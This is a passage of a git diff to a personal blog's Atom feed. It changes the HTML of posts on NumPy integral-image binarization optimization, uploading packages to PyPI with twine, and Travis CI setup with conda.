+&lt;p&gt;以构造A为例， A实际上是对原先的矩阵向上和向左平移了一半的boxsize的距离， 比如对于矩阵右下角的点，A对应于 &lt;code&gt;integral_map[h-half_boxsize, w-half_boxsize]&lt;/code&gt;&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;但是对于左上角的点， 超出了累积矩阵的范围， 为了避免额外的对边界的判断， 我们要额外构造出边框。&lt;br&gt;
+&lt;/p&gt;
 &lt;p&gt;想象一下， 比如我们有一个5x5的矩阵， boxsize取3, &lt;/p&gt;
-&lt;p&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  0 1 2 3 4
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;  0 1 2 3 4
 0 * * * * *
 1 * * * * *
 2 * * * * *
 3 * * * * *
 4 * * * * *
 &lt;/pre&gt;&lt;/div&gt;
-&lt;br /&gt;
-计算 (2, 2) 的时候， 取 (1, 1), (1, 3)， （3，1）， （3，3）四个点&lt;br /&gt;
-计算(0,0)上的和的时候， 右下角取（1，1）， 左上角超出了边界，所以只能取（0，0）&lt;br /&gt;
-计算（0，1）的时候，右下角是（1，2） 但是左上角还是（0，0）    &lt;/p&gt;
+
+
+&lt;p&gt;计算 (2, 2) 的时候， 取 (1, 1), (1, 3)， （3，1）， （3，3）四个点&lt;br&gt;
+计算(0,0)上的和的时候， 右下角取（1，1）， 左上角超出了边界，所以只能取（0，0）&lt;br&gt;
+计算（0，1）的时候，右下角是（1，2） 但是左上角还是（0，0）  &lt;br&gt;
+&lt;/p&gt;
 &lt;p&gt;所以我们可以构造出一个&lt;code&gt;(boxsize-1)/2&lt;/code&gt; 长度的边框，边框上的值和边界的值一样。 这样我们可以通过平移得到ABCD四个矩阵， 而不用额外的边界判断。 &lt;/p&gt;
-&lt;p&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;vector_method&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;threshold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;vector_method&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;threshold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="n"&gt;inv_value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="mi"&gt;255&lt;/span&gt;
     &lt;span class="n"&gt;integral_map&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;zeros_like&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dtype&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 
@@ -287,8 +490,10 @@ opencv_way take 35.920926 ms
     &lt;span class="n"&gt;ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;set_value&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;inv_value&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
     &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;astype&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;uint8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
-&lt;br /&gt;
-但是， 现在还有一道阴影笼罩着我们， 我们没有办法得到窗口的实际大小。 边界附近的点上的窗口是变化的， 我们得额外构造出一个矩阵&lt;code&gt;COUNT&lt;/code&gt;来表示每个点上的窗口大小。  &lt;/p&gt;
+
+
+&lt;p&gt;但是， 现在还有一道阴影笼罩着我们， 我们没有办法得到窗口的实际大小。 边界附近的点上的窗口是变化的， 我们得额外构造出一个矩阵&lt;code&gt;COUNT&lt;/code&gt;来表示每个点上的窗口大小。&lt;br&gt;
+&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;get_count_matrix&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="sd"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
 &lt;span class="sd"&gt;    矩阵上每个点的值表示该点上的窗口覆盖的总点数。&lt;/span&gt;
@@ -319,10 +524,12 @@ vector_method take 22.166661 ms
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;现在我们比最初快了80倍， 已经接近论文上的理论速度了， 但是&lt;code&gt;get_count_matrix&lt;/code&gt;函数显得非常的力不从心， 还可以寻找优化的办法。  &lt;/p&gt;
-&lt;h2 id="_7"&gt;&lt;a name="user-content-_7" href="#_7" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;优化后的向量化方法&lt;/h2&gt;
+&lt;p&gt;现在我们比最初快了80倍， 已经接近论文上的理论速度了， 但是&lt;code&gt;get_count_matrix&lt;/code&gt;函数显得非常的力不从心， 还可以寻找优化的办法。&lt;br&gt;
+&lt;/p&gt;
+&lt;h2&gt;优化后的向量化方法&lt;/h2&gt;
 &lt;p&gt;回想之前的整个过程， 我们对边界的处理实际上过于保守了， 导致计算窗口覆盖点数的时候过于小心翼翼了(不然boxsize-1是怎么得出来的， 都是泪啊)。&lt;/p&gt;
-&lt;p&gt;我们可以在计算累积和之前先对边界翻折来进行填充， 之后再对扩展后的矩阵进行累积和，这样可以省略掉&lt;code&gt;get_count_matrix&lt;/code&gt;函数， 统一采用&lt;code&gt;(boxsize-1)*(boxsize-1)&lt;/code&gt;。  &lt;/p&gt;
+&lt;p&gt;我们可以在计算累积和之前先对边界翻折来进行填充， 之后再对扩展后的矩阵进行累积和，这样可以省略掉&lt;code&gt;get_count_matrix&lt;/code&gt;函数， 统一采用&lt;code&gt;(boxsize-1)*(boxsize-1)&lt;/code&gt;。&lt;br&gt;
+&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;optimized_vector_method&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;threshold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
     &lt;span class="n"&gt;inv_value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="mi"&gt;255&lt;/span&gt;
     &lt;span class="n"&gt;half_s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
@@ -351,32 +558,39 @@ vector_method take 22.166661 ms
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;看看计算时间，  &lt;/p&gt;
+&lt;p&gt;看看计算时间，&lt;br&gt;
+&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;⇒  python3 implement.py
 Image shape 640x480
 optimized_vector_method take 10.539570999999999 ms
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;比最初快了150倍， 而且超过了论文上的C语言实现的15ms的时间。  &lt;/p&gt;
-&lt;h2 id="_8"&gt;&lt;a name="user-content-_8" href="#_8" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;总结分析&lt;/h2&gt;
-&lt;p&gt;对于最后的这个方法， 需要额外解释一下为什么会比论文快。&lt;br /&gt;
-其中一个是CPU的原因， 论文上用的是4核奔腾3.4Ghz的CPU，而我自己的是i5 2.7GHz。&lt;br /&gt;
+&lt;p&gt;比最初快了150倍， 而且超过了论文上的C语言实现的15ms的时间。&lt;br&gt;
+&lt;/p&gt;
+&lt;h2&gt;总结分析&lt;/h2&gt;
+&lt;p&gt;对于最后的这个方法， 需要额外解释一下为什么会比论文快。&lt;br&gt;
+其中一个是CPU的原因， 论文上用的是4核奔腾3.4Ghz的CPU，而我自己的是i5 2.7GHz。&lt;br&gt;
 i5应该是快一些的， （我猜）&lt;/p&gt;
-&lt;p&gt;之后是在对窗口大小的计算时间上， 因为我们通过填充扩展矩阵， 使得每一个点的窗口大小都是固定的值， 比论文中的方法省去了多余的窗口大小计算和多余的边界判断。&lt;br /&gt;
-但是扩展矩阵在计算累积和的时候有额外的时间消耗， boxsize默认采用边长的1/8， &lt;br /&gt;
-构造后的矩阵比原先大了 81/64 倍的大小。&lt;br /&gt;
-不过在之后的计算中并没有额外的消耗。  &lt;/p&gt;
+&lt;p&gt;之后是在对窗口大小的计算时间上， 因为我们通过填充扩展矩阵， 使得每一个点的窗口大小都是固定的值， 比论文中的方法省去了多余的窗口大小计算和多余的边界判断。&lt;br&gt;
+但是扩展矩阵在计算累积和的时候有额外的时间消耗， boxsize默认采用边长的1/8， 
+构造后的矩阵比原先大了 81/64 倍的大小。&lt;br&gt;
+不过在之后的计算中并没有额外的消耗。&lt;br&gt;
+&lt;/p&gt;
 &lt;p&gt;再次， 虽然我们构造出了4个矩阵ABCD， 但是实际上没有对内存做拷贝， ABCD都是累积和矩阵上的映射， 没有对内存中的实际数据做拷贝。&lt;/p&gt;
-&lt;p&gt;最后，   &lt;/p&gt;
-&lt;p&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;integral_map = integral_map.astype(np.uint32)
+&lt;p&gt;最后， &lt;br&gt;
+&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;integral_map = integral_map.astype(np.uint32)
 &lt;/pre&gt;&lt;/div&gt;
-&lt;br /&gt;
-我指定了矩阵中的元素的大小， 统一为无符号32位， 速度又得到了一定的提升。&lt;br /&gt;
+
+
+&lt;p&gt;我指定了矩阵中的元素的大小， 统一为无符号32位， 速度又得到了一定的提升。&lt;br&gt;
 但是uint32有其局限， 只能存下2^32次方的数据， 灰度图的每一个点的最大取值是2^8， 于是uint32的累积矩阵只能存下2^24个像素点， 然而由于填充了边框， 矩阵比实际大了81/64， 约1.266倍， &lt;code&gt;sqrt(2^24/1.266) = 3640&lt;/code&gt;,  所以只能处理3640x3640的图片， 但是从平均情况来说， 每一个点平均取2^7， 于是我们可以处理最大5148x5148的图片。&lt;/p&gt;
-&lt;p&gt;到此， 完成了从最初的1600ms到10ms的优化。  &lt;/p&gt;
-&lt;h2 id="_9"&gt;&lt;a name="user-content-_9" href="#_9" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;彩蛋&lt;/h2&gt;
-&lt;p&gt;混沌邪恶  &lt;/p&gt;
+&lt;p&gt;到此， 完成了从最初的1600ms到10ms的优化。&lt;br&gt;
+&lt;/p&gt;
+&lt;h2&gt;彩蛋&lt;/h2&gt;
+&lt;p&gt;混沌邪恶&lt;br&gt;
+&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;cv2&lt;/span&gt; &lt;span class="kn"&gt;as&lt;/span&gt; &lt;span class="nn"&gt;cv&lt;/span&gt;
 
 &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;wtf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;threshold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
@@ -385,15 +599,16 @@ i5应该是快一些的， （我猜）&lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;咕咕咕？？？&lt;br /&gt;
+&lt;p&gt;咕咕咕？？？&lt;br&gt;
 我选择opencv自带的局部自适应高斯二值化&lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;⇒  python3 implent.py
 Image shape 640x480
 wtf take 8.884578000000001 ms
-&lt;/pre&gt;&lt;/div&gt;</summary><category term="python"></category><category term="numpy"></category></entry><entry><title>How to upload package to pypi</title><link href="http://littlezz.github.io/how-to-upload-package-to-pypi.html" rel="alternate"></link><updated>2016-05-15T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-05-15:how-to-upload-package-to-pypi.html</id><summary type="html">&lt;h2 id="install-twine"&gt;&lt;a name="user-content-install-twine" href="#install-twine" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;Install twine&lt;/h2&gt;
+&lt;/pre&gt;&lt;/div&gt;</content><category term="python"></category><category term="numpy"></category></entry><entry><title>How to upload package to pypi</title><link href="http://littlezz.github.io/how-to-upload-package-to-pypi.html" rel="alternate"></link><published>2016-05-15T00:00:00+08:00</published><updated>2016-05-15T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-05-15:/how-to-upload-package-to-pypi.html</id><summary type="html">&lt;h2&gt;Install twine&lt;/h2&gt;
 &lt;p&gt;&lt;code&gt;pip install twine&lt;/code&gt;&lt;/p&gt;
-&lt;h2 id="init-file"&gt;&lt;a name="user-content-init-file" href="#init-file" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;Init file&lt;/h2&gt;
-&lt;p&gt;First of all, make sure that the structure of project is correct. Says, your project code in a folder call 'foo', then you have &lt;code&gt;README&lt;/code&gt; and some other files in the same level.  &lt;/p&gt;
+&lt;h2&gt;Init file&lt;/h2&gt;
+&lt;p&gt;First of all, make sure that the structure of project is correct. Says, your project code in a folder call 'foo', then you have &lt;code&gt;README&lt;/code&gt; and some other files in the same level.&lt;br&gt;
+&lt;/p&gt;
 &lt;p&gt;For example, &lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;.
 ├── foo
@@ -402,40 +617,78 @@ wtf take 8.884578000000001 ms
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;Secondly, add specify file to the root folder.  &lt;/p&gt;
+&lt;p&gt;Secondly, add specify file to the root folder.&lt;br&gt;
+&lt;/p&gt;
 &lt;ul&gt;
-&lt;li&gt;README.rst  &lt;/li&gt;
-&lt;li&gt;MANIFEST.in  &lt;/li&gt;
-&lt;li&gt;setup.py  &lt;/li&gt;
+&lt;li&gt;README.rst&lt;br&gt;
+&lt;/li&gt;
+&lt;li&gt;MANIFEST.in&lt;br&gt;
+&lt;/li&gt;
+&lt;li&gt;setup.py&lt;br&gt;
+&lt;/li&gt;
 &lt;li&gt;setup.cfg(option)&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;pypi do not know markdown format readme, there is only rst format available.&lt;/p&gt;
-&lt;h2 id="setuppy"&gt;&lt;a name="user-content-setuppy" href="#setuppy" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;setup.py&lt;/h2&gt;
-&lt;p&gt;look at&lt;br /&gt;
+&lt;h2&gt;setup.py&lt;/h2&gt;
+&lt;p&gt;look at
+&lt;a href="https://github.com/pypa/sampleproject/blob/master/setup.py"&gt;https://github.com/pypa/sampleproject/blob/master/setup.py …&lt;/a&gt;&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Install twine&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;pip install twine&lt;/code&gt;&lt;/p&gt;
+&lt;h2&gt;Init file&lt;/h2&gt;
+&lt;p&gt;First of all, make sure that the structure of project is correct. Says, your project code in a folder call 'foo', then you have &lt;code&gt;README&lt;/code&gt; and some other files in the same level.&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;For example, &lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;.
+├── foo
+│   └── a.py
+└── readme.md
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Secondly, add specify file to the root folder.&lt;br&gt;
+&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;README.rst&lt;br&gt;
+&lt;/li&gt;
+&lt;li&gt;MANIFEST.in&lt;br&gt;
+&lt;/li&gt;
+&lt;li&gt;setup.py&lt;br&gt;
+&lt;/li&gt;
+&lt;li&gt;setup.cfg(option)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;pypi do not know markdown format readme, there is only rst format available.&lt;/p&gt;
+&lt;h2&gt;setup.py&lt;/h2&gt;
+&lt;p&gt;look at
 &lt;a href="https://github.com/pypa/sampleproject/blob/master/setup.py"&gt;https://github.com/pypa/sampleproject/blob/master/setup.py&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;after finish &lt;code&gt;setup.py&lt;/code&gt;&lt;br /&gt;
-you can use   &lt;/p&gt;
-&lt;p&gt;&lt;code&gt;pip install -e .&lt;/code&gt;&lt;br /&gt;
-install package locally on editable mode.&lt;br /&gt;
-It will also install dependency.  &lt;/p&gt;
-&lt;h2 id="make-dist"&gt;&lt;a name="user-content-make-dist" href="#make-dist" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;Make dist&lt;/h2&gt;
-&lt;h3 id="build-source-distribution"&gt;&lt;a name="user-content-build-source-distribution" href="#build-source-distribution" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;Build source distribution&lt;/h3&gt;
-&lt;p&gt;run&lt;br /&gt;
-&lt;code&gt;python setup.py sdist&lt;/code&gt;  &lt;/p&gt;
-&lt;h3 id="build-wheel"&gt;&lt;a name="user-content-build-wheel" href="#build-wheel" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;Build wheel.&lt;/h3&gt;
-&lt;p&gt;If your code compat py2 and py3.&lt;br /&gt;
-&lt;code&gt;python setup.py bdist_wheel --universal&lt;/code&gt;  &lt;/p&gt;
-&lt;p&gt;else, &lt;br /&gt;
-&lt;code&gt;python setup.py bdist_wheel&lt;/code&gt;  &lt;/p&gt;
-&lt;p&gt;if your code is specify for some python version, add python tag in &lt;code&gt;setup.cfg&lt;/code&gt;  &lt;/p&gt;
+&lt;p&gt;after finish &lt;code&gt;setup.py&lt;/code&gt;&lt;br&gt;
+you can use &lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;pip install -e .&lt;/code&gt;
+install package locally on editable mode.&lt;br&gt;
+It will also install dependency.&lt;br&gt;
+&lt;/p&gt;
+&lt;h2&gt;Make dist&lt;/h2&gt;
+&lt;h3&gt;Build source distribution&lt;/h3&gt;
+&lt;p&gt;run&lt;br&gt;
+&lt;code&gt;python setup.py sdist&lt;/code&gt;&lt;br&gt;
+&lt;/p&gt;
+&lt;h3&gt;Build wheel.&lt;/h3&gt;
+&lt;p&gt;If your code compat py2 and py3.&lt;br&gt;
+&lt;code&gt;python setup.py bdist_wheel --universal&lt;/code&gt;&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;else, 
+&lt;code&gt;python setup.py bdist_wheel&lt;/code&gt;&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;if your code is specify for some python version, add python tag in &lt;code&gt;setup.cfg&lt;/code&gt;&lt;br&gt;
+&lt;/p&gt;
 &lt;p&gt;For example, if your code is only available in py3.5 and 3.4 &lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;[bdist_wheel]&lt;/span&gt;
 &lt;span class="na"&gt;python-tag&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;py35, py34&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;h2 id="upload"&gt;&lt;a name="user-content-upload" href="#upload" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;Upload&lt;/h2&gt;
-&lt;p&gt;look at &lt;a href="http://python-packaging-user-guide.readthedocs.io/en/latest/distributing/#uploading-your-project-to-pypi"&gt;http://python-packaging-user-guide.readthedocs.io/en/latest/distributing/#uploading-your-project-to-pypi&lt;/a&gt;  &lt;/p&gt;
+&lt;h2&gt;Upload&lt;/h2&gt;
+&lt;p&gt;look at &lt;a href="http://python-packaging-user-guide.readthedocs.io/en/latest/distributing/#uploading-your-project-to-pypi"&gt;http://python-packaging-user-guide.readthedocs.io/en/latest/distributing/#uploading-your-project-to-pypi&lt;/a&gt;&lt;br&gt;
+&lt;/p&gt;
 &lt;p&gt;Create a account on pypi, register your package,  write a &lt;code&gt;~/.pypirc&lt;/code&gt; &lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;[distutils]&lt;/span&gt;
 &lt;span class="na"&gt;index-servers&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;pypi&lt;/span&gt;
@@ -447,20 +700,44 @@ It will also install dependency.  &lt;/p&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
-&lt;p&gt;left the password empty, you can use twine with &lt;code&gt;-p PASSWORD&lt;/code&gt;.  &lt;/p&gt;
-&lt;p&gt;upload your dist folder  &lt;/p&gt;
-&lt;p&gt;&lt;code&gt;twine upload dist/*&lt;/code&gt;  &lt;/p&gt;
-&lt;h2 id="reference"&gt;&lt;a name="user-content-reference" href="#reference" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;Reference&lt;/h2&gt;
+&lt;p&gt;left the password empty, you can use twine with &lt;code&gt;-p PASSWORD&lt;/code&gt;.&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;upload your dist folder&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;twine upload dist/*&lt;/code&gt;&lt;br&gt;
+&lt;/p&gt;
+&lt;h2&gt;Reference&lt;/h2&gt;
 &lt;ul&gt;
-&lt;li&gt;&lt;a href="http://python-packaging-user-guide.readthedocs.io/en/latest/distributing/"&gt;http://python-packaging-user-guide.readthedocs.io/en/latest/distributing/&lt;/a&gt;  &lt;/li&gt;
-&lt;li&gt;&lt;a href="http://peterdowns.com/posts/first-time-with-pypi.html"&gt;http://peterdowns.com/posts/first-time-with-pypi.html&lt;/a&gt;  &lt;/li&gt;
+&lt;li&gt;&lt;a href="http://python-packaging-user-guide.readthedocs.io/en/latest/distributing/"&gt;http://python-packaging-user-guide.readthedocs.io/en/latest/distributing/&lt;/a&gt;&lt;br&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;a href="http://peterdowns.com/posts/first-time-with-pypi.html"&gt;http://peterdowns.com/posts/first-time-with-pypi.html&lt;/a&gt;&lt;br&gt;
+&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;2016-05-15 11:43:33&lt;/p&gt;</summary><category term="python"></category><category term="小结"></category></entry><entry><title>Travis CI with Numpy and Pytest</title><link href="http://littlezz.github.io/travis-ci-with-numpy-and-pytest.html" rel="alternate"></link><updated>2016-03-31T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-03-31:travis-ci-with-numpy-and-pytest.html</id><summary type="html">&lt;p&gt;It takes long time to install scientific python package by &lt;code&gt;pip&lt;/code&gt; in travis and sometime fail.  &lt;/p&gt;
-&lt;p&gt;The solve is to use conda to install binary package. &lt;br /&gt;
-&lt;a href="http://conda.pydata.org/docs/travis.html"&gt;http://conda.pydata.org/docs/travis.html&lt;/a&gt;  &lt;/p&gt;
-&lt;p&gt;Note that some package not in conda, you can use &lt;code&gt;pip&lt;/code&gt; install it, for example, &lt;code&gt;py.test&lt;/code&gt;  &lt;/p&gt;
-&lt;p&gt;Here is my &lt;a href="https://github.com/littlezz/ESL-Model"&gt;ESL-Model&lt;/a&gt; .trais.yml, you can view on github &lt;a href="https://github.com/littlezz/ESL-Model/blob/master/.travis.yml"&gt;https://github.com/littlezz/ESL-Model/blob/master/.travis.yml&lt;/a&gt;  &lt;/p&gt;
-&lt;p&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;language: python
+&lt;p&gt;2016-05-15 11:43:33&lt;/p&gt;</content><category term="python"></category><category term="小结"></category></entry><entry><title>Travis CI with Numpy and Pytest</title><link href="http://littlezz.github.io/travis-ci-with-numpy-and-pytest.html" rel="alternate"></link><published>2016-03-31T00:00:00+08:00</published><updated>2016-03-31T00:00:00+08:00</updated><author><name>littlezz</name></author><id>tag:littlezz.github.io,2016-03-31:/travis-ci-with-numpy-and-pytest.html</id><summary type="html">&lt;p&gt;It takes long time to install scientific python package by &lt;code&gt;pip&lt;/code&gt; in travis and sometime fail.&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;The solve is to use conda to install binary package. &lt;br&gt;
+&lt;a href="http://conda.pydata.org/docs/travis.html"&gt;http://conda.pydata.org/docs/travis.html&lt;/a&gt;&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;Note that some package not in conda, you can use &lt;code&gt;pip&lt;/code&gt; install it, for example, &lt;code&gt;py.test&lt;/code&gt;&lt;br&gt;
+&lt;/p&gt;
+&lt;p&gt;Here is my &lt;a href="https://github.com/littlezz/ESL-Model"&gt;ESL-Model&lt;/a&gt; .trais.yml, you can view on github &lt;a href="https://github.com/littlezz/ESL-Model/blob/master/.travis.yml"&gt;https://github.com/littlezz/ESL-Model/blob/master/.travis.yml&lt;/a&gt;&lt;br&gt;
+&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;language: python
+python:
